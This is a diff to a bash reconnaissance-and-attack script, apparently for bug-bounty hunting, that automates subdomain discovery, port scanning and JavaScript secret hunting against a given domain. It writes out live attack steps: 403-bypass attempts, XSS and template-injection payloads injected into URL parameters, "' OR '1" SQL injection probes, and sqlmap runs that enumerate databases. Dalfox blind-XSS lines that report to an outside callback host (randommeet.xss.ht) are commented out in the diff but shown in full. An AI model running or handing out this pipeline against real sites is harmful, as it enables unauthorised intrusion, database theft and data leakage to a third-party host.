@@ -100,7 +100,7 @@ sudo rm -r $2-nucleidns.txt
 
 
 echo -e "${NORMAL}Eyewitness Snapshot of each Live subdomain ${NORMAL} ..."
-python3 ~/tools/EyeWitness/Python/EyeWitness.py -f $2-alive.txt --no-prompt --web --timeout 15 
+python3 ~/tools/EyeWitness/Python/EyeWitness.py -f $2-alive.txt --no-prompt --web --timeout 20
 sleep 2
 
 echo -e "${NORMAL}Naabu Portscan without Cloudflare on Live subdomain ${NORMAL} ..."
@@ -249,6 +249,9 @@ sudo rm -r $2-jsfiles.txt
 sudo rm -r $2-jsfilesgau.txt
 sudo rm -r $2-finalJSFiles.txt
 
+echo -e "Starting ${GREEN}JS Link Finding using JSScanner by dark-worflord${NORMAL} for on $1... ${NORMAL}"
+jsscanner $2-alive.txt
+
 
 echo -e "Starting ${GREEN}Endpoint Gathering from JS Files${NORMAL} for on $1... ${NORMAL}"
 interlace -tL $2-liveJSFiles.txt -threads 5 -c "echo 'Scanning _target_ Now' ; python3 ~/tools/LinkFinder/linkfinder.py -d -i _target_ -o cli >> $2-JSendpoints.txt" -v
@@ -259,32 +262,32 @@ interlace -tL $2-liveJSFiles.txt -threads 5 -c "python3 ~/tools/secretfinder/Sec
 
 
 echo -e "Starting ${GREEN}403 Bypass Check${NORMAL} on $1... ${NORMAL} "
-cat $2-allurls.txt $2-alive.txt $2-JSendpoints.txt | httpx -follow-redirects -silent -status-code -mc 403,401,402 | cut -d ' ' -f1 | sort -u > $2-403StatusUrls.txt
-cat $2-403StatusUrls.txt | while read domain;do bash ~/tools/Bug-Bounty-Scripts/403-forbidden-bypass.sh $domain ;done | grep -v "403" > $2-403Bypass.txt
+cat $2-allurls.txt $2-alive.txt $2-JSendpoints.txt | httpx -follow-redirects -silent -status-code -mc 403 | cut -d ' ' -f1 | sort -u > $2-403StatusUrls.txt
+cat $2-403StatusUrls.txt | while read domain;do bash ~/tools/Bug-Bounty-Scripts/403-forbidden-bypass.sh $domain ;done | grep -v "403" | tee -a $2-403BypassUsingHeaders.txt
 #add $1 on line 43 as such echo "Staring! please wait... $1" to get better Resul Output with domain name
 
-echo -e "Starting ${GREEN}XSS without GF via qsreplace${NORMAL} on $1... ${NORMAL} "
-sleep 2
-cat $2-allurls.txt |grep '=' | qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m" Vulnerable;done | tee -a $2-XSSqsreplace.txt
+#echo -e "Starting ${GREEN}XSS without GF via qsreplace${NORMAL} on $1... ${NORMAL} "
+#sleep 2
+#cat $2-allurls.txt |grep '=' | qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m" Vulnerable;done | tee -a $2-XSSqsreplace.txt
 
-echo -e "Starting ${GREEN}SSTI qsreplace${NORMAL} on $1... ${NORMAL} "
-sleep 2
-cat $2-allurls.txt |grep '=' | qsreplace "xssfound{{7*7}}"  | httpx -match-regex 'xssfound49' -threads 300 -http-proxy http://127.0.0.1:8080 | tee -a $2-SSTIqsreplace.txt
-
-
-
-echo -e "Starting ${GREEN}Paramfinder & XSS${NORMAL} for on $1... ${NORMAL}"
-cat $2-alive.txt | while read domain;do python3 ~/tools/ParamSpider/paramspider.py -d $domain --level high --exclude woff,css,js,png,svg,php,jpg; done 
-mv output/https\:/  paramspider
-sudo rm -r output
-cat ./paramspider/*txt > $2-paramsDalfoxInput.txt
-sudo rm -r paramspider
-cat  $2-paramDalfoxInput.txt | dalfox -b randommeet.xss.ht -o $2-paramDalfoxXSSOutput.txt
+#echo -e "Starting ${GREEN}SSTI qsreplace${NORMAL} on $1... ${NORMAL} "
+#sleep 2
+#cat $2-allurls.txt |grep '=' | qsreplace "xssfound{{7*7}}"  | httpx -match-regex 'xssfound49' -threads 300 -http-proxy http://127.0.0.1:8080 | tee -a $2-SSTIqsreplace.txt
 
 
-echo -e "Starting ${GREEN}XSS oneliner with Dalfox${NORMAL} on $1... ${NORMAL} "
-sleep 2
-gospider -S $2-alive.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe -b randommeet.xss.ht -o $2-GospiderXSSDalfox.txt
+
+#echo -e "Starting ${GREEN}Paramfinder & XSS${NORMAL} for on $1... ${NORMAL}"
+#cat $2-alive.txt | while read domain;do python3 ~/tools/ParamSpider/paramspider.py -d $domain --level high --exclude woff,css,js,png,svg,php,jpg; done 
+#mv output/https\:/  paramspider
+#sudo rm -r output
+#cat ./paramspider/*txt > $2-paramsDalfoxInput.txt
+#sudo rm -r paramspider
+#cat  $2-paramDalfoxInput.txt | dalfox -b randommeet.xss.ht -o $2-paramDalfoxXSSOutput.txt
+
+
+#echo -e "Starting ${GREEN}XSS oneliner with Dalfox${NORMAL} on $1... ${NORMAL} "
+#sleep 2
+#gospider -S $2-alive.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe -b randommeet.xss.ht -o $2-GospiderXSSDalfox.txt
 
 echo -e "Starting ${GREEN}SQLInjection Check${NORMAL} for on $1... ${NORMAL}"
 cat $2-allurls.txt | gf sqli | urlive | tee $2-gfsqli.txt && ~/tools/sqlmap/sqlmap.py -m $2-gfsqli.txt --dbs --batch > $2-SQLIPositives.txt
@@ -293,5 +296,5 @@ cat $2-allurls.txt |grep '=' |qsreplace "' OR '1" | httpx -silent -threads 100 |
 find . -type f -size 0 -delete
 echo -e "${BOLD}\nAll your outputs are saved in ${GREEN}$2/ \n"
 
-#not running Get "zen-paramDalfoxInput.txt": unsupported protocol scheme ""
-#zen-paramDalfoxInput.txt"
+##/root/tools/Sublist3r/sublist3r.py:614: DeprecationWarning: please use dns.resolver.Resolver.resolve() instead
+#  ip = Resolver.query(host, 'A')[0].to_text()
